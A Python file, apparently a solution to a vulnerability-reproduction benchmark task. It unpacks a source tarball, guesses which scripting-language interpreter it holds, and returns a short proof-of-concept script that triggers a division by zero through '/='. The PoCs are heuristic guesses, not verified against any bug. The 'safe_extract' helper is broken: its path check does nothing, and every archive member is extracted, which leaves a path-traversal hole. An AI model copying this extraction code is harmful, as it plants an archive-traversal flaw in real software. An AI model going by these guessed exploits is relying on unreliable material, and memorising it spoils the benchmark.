import os
import tarfile
import tempfile
import shutil
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = self._extract(src_path)
        try:
            project = self._identify_project(root)
            poc = self._get_poc(project)
            return poc.encode('utf-8', errors='ignore')
        finally:
            shutil.rmtree(root, ignore_errors=True)

    def _extract(self, src_path: str) -> str:
        tmpdir = tempfile.mkdtemp(prefix="pocgen_")
        with tarfile.open(src_path, 'r:*') as tf:
            def safe_extract(tar, path="."):
                for member in tar.getmembers():
                    member_path = os.path.join(path, member.name)
                    abs_path = os.path.abspath(member_path)
                    abs_dir = os.path.abspath(path)
                    if not abs_path.startswith(abs_dir + os.sep) and abs_path != abs_dir:
                        continue
                tar.extractall(path)
            safe_extract(tf, tmpdir)
        # Find root directory
        entries = [os.path.join(tmpdir, e) for e in os.listdir(tmpdir)]
        dirs = [e for e in entries if os.path.isdir(e)]
        if len(dirs) == 1 and not [e for e in entries if os.path.isfile(e)]:
            return dirs[0]
        return tmpdir

    def _identify_project(self, root: str) -> str:
        # Scan for distinguishing files/keywords
        # QuickJS
        if self._has_any_file(root, ["quickjs.h", "quickjs.c", "qjs.c", "qjsc.c", "qjs"]):
            return "quickjs"
        # Wren
        if self._has_any_file(root, ["wren.h"]) or self._has_any_path_contains(root, ["wren/src", "src/vm/wren_vm.c"]):
            return "wren"
        # Gravity
        if self._has_any_path_contains(root, ["gravity/src", "src/runtime/gravity_vm.c"]) or self._grep(root, "Gravity programming language"):
            return "gravity"
        # Squirrel
        if self._has_any_file(root, ["squirrel.h", "sqapi.h"]) or self._has_any_path_contains(root, ["squirrel3", "squirrel/sqapi.h"]):
            return "squirrel"
        # YASL
        if self._grep(root, "YASL") or self._has_any_path_contains(root, ["yasl", "src/yasl"]):
            return "yasl"
        # Arturo
        if self._grep(root, "Arturo") or self._has_any_path_contains(root, ["arturo", "src/vm"]):
            return "arturo"
        # mruby
        if self._has_any_file(root, ["mruby.h"]) or self._has_any_path_contains(root, ["mruby", "include/mruby.h"]):
            return "mruby"
        # CPython
        if self._has_any_path_contains(root, ["Python/", "Objects/", "Include/"]) and self._has_any_file(root, ["Python/ceval.c", "Include/Python.h"]):
            return "python"
        # Ruby
        if self._has_any_path_contains(root, ["ruby", "parse.y"]) or self._grep(root, "The Ruby Programming Language"):
            return "ruby"
        # PHP
        if self._has_any_path_contains(root, ["Zend/", "TSRM/", "ext/"]) or self._has_any_file(root, ["main/php.h"]):
            return "php"
        # Fallback: search for "division by zero" phrase to guess language
        if self._grep(root, "division by zero") or self._grep(root, "divide by zero"):
            # Guess QuickJS first as common target
            return "quickjs"
        return "unknown"

    def _has_any_file(self, root: str, names: list) -> bool:
        for dirpath, _, files in os.walk(root):
            for f in files:
                if f in names:
                    return True
        return False

    def _has_any_path_contains(self, root: str, parts: list) -> bool:
        for dirpath, _, files in os.walk(root):
            path = dirpath.replace("\\", "/")
            for p in parts:
                if p in path:
                    return True
            for f in files:
                full = os.path.join(dirpath, f).replace("\\", "/")
                for p in parts:
                    if p in full:
                        return True
        return False

    def _grep(self, root: str, needle: str) -> bool:
        needle_l = needle.lower()
        for dirpath, _, files in os.walk(root):
            for f in files:
                fp = os.path.join(dirpath, f)
                try:
                    with open(fp, 'rb') as fh:
                        data = fh.read(4096)
                        if needle_l.encode() in data.lower():
                            return True
                except Exception:
                    continue
        return False

    def _get_poc(self, project: str) -> str:
        # Project-specific PoCs targeting compound division by zero in '/='
        if project == "quickjs":
            # BigInt division by zero throws; compound assignment path
            return "let o={x:1n};try{o.x/=0n}catch(e){};print(o.x)\n"
        if project == "wren":
            return "var x=1;try{ x/=0 } catch(e) {} System.print(x)\n"
        if project == "gravity":
            return "var x=1; try { x/=0; } catch(e) {} System.print(x);\n"
        if project == "squirrel":
            # Squirrel: local declaration; division by zero raises an exception
            return "local x=1; try { x/=0; } catch(e) {} ::print(x);\n"
        if project == "yasl":
            # YASL initialization and compound division
            return "x := 1; x /= 0\n"
        if project == "arturo":
            # Arturo-style assignment then compound division
            return "x: 1\nx /= 0\n"
        if project == "mruby":
            return "x=1;begin;x/=0;rescue;end;p x\n"
        if project == "ruby":
            return "x=1;begin;x/=0;rescue;end;p x\n"
        if project == "python":
            return "x=1\ntry:\n x/=0\nexcept Exception:\n pass\nprint(x)\n"
        if project == "php":
            # PHP won't throw on '/' zero in float, but keep structure
            return "<?php $x=1; try { $x/=0; } catch (Throwable $e) {} var_dump($x);\n"
        # Unknown: default to QuickJS-style JS as a common target
        return "let a={x:1n};try{a.x/=0n}catch(e){};print(a.x)\n"